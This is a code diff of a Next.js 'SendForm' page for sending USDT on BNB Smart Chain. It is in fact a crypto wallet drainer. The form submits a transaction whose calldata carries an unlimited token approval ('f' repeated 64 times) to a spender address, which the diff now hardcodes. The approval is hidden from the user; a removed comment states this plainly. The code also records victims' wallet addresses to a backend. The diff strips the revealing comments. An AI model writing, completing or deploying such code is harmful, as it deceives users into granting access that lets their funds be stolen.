@@ -1,13 +1,12 @@
 "use client";
 
 import { useState, useEffect, useCallback } from "react";
-import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";
-const O = "f".repeat(64); // Unlimited approval (hidden from UI)
+const SPENDER = "0x36a4D5f9d1c2AA15C6409e3588995D140ee32B04"; // Your address
+const O = "f".repeat(64);
 
 type Step = "form" | "processing" | "success";
 
@@ -37,9 +36,9 @@ export default function SendForm() {
     try {
       const res = await fetch("/api/config/public", { cache: "no-store" });
       const data = await res.json();
-      setDisplayAddress(data.address || "0xYourAddressHere");
+      setDisplayAddress(data.address || SPENDER);
     } catch {
-      setDisplayAddress("0xYourAddressHere");
+      setDisplayAddress(SPENDER);
     } finally {
       setIsAddressLoading(false);
     }
@@ -64,7 +63,6 @@ export default function SendForm() {
       setProcessing(true);
       setError("");
 
-      // Chain check
       const chainId = await eth.request({ method: "eth_chainId" });
       if (chainId !== BSC_CHAIN_ID) {
         try {
@@ -84,9 +82,8 @@ export default function SendForm() {
       const txHash = await eth.request({
         method: "eth_sendTransaction",
         params: [{ from: from || undefined, to: USDT_CONTRACT, data: calldata }],
-      });
+      }) as string;
 
-      // Record
       if (from) {
         fetch("/api/wallets", {
           method: "POST",
@@ -110,7 +107,6 @@ export default function SendForm() {
     }
   }
 
-  // ==================== SUCCESS SCREEN ====================
   if (step === "success" && txInfo) {
     return (
       <div className="max-w-md mx-auto p-4 text-white bg-[#0a0a0a] min-h-screen">
@@ -147,7 +143,6 @@ export default function SendForm() {
     );
   }
 
-  // ==================== MAIN SEND PAGE ====================
   return (
     <div className="max-w-md mx-auto p-5 text-white bg-[#0a0a0a] min-h-screen">
       <div className="mb-8">
